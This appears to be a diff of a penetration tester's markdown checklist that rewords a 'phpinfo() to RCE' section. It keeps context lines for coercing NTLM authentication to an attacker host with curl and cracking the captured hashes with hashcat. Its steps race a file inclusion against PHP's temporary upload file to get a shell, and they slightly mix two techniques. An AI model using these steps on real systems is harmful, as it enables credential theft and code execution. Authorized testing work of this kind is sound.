@@ -76,12 +76,10 @@ curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=\\\\<LHOST>\\nothing"
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 ## phpinfo() to RCE
-
-A phpinfo() page plus any file inclusion is code execution.
-
-- [ ] Confirm a phpinfo() page is reachable (phpinfo.php, info.php, test.php, or a ?phpinfo=1-style parameter)
-- [ ] Loot it first: DOCUMENT_ROOT (web root for uploads), disable_functions, extension_dir, open_basedir, session.save_path
-- [ ] POST a PHP payload to the phpinfo page as multipart with PHP_SESSION_UPLOAD_PROGRESS in the body
-- [ ] PHP writes the half-uploaded session file to the tmp dir; the phpinfo output leaks its temporary path
-- [ ] Race the LFI to include that tmp path before the request completes and the file is deleted
-- [ ] Win the race with many parallel requests on both sides; one include lands your payload as a shell
+A phpinfo() page and any file inclusion together are code execution.
+- [ ] A phpinfo() page I can reach: phpinfo.php, info.php, test.php, or a parameter such as ?phpinfo=1
+- [ ] Read first: DOCUMENT_ROOT, the web root for uploads, then disable_functions, extension_dir, open_basedir and session.save_path
+- [ ] A PHP payload sent to the phpinfo() page as a multipart POST, with PHP_SESSION_UPLOAD_PROGRESS in the body
+- [ ] PHP writes the half-uploaded file to its temporary folder, and the phpinfo() output shows its temporary path
+- [ ] The inclusion pointed at that path before the request ends and the file is deleted
+- [ ] Many requests in parallel on both sides win the race: one inclusion runs my payload
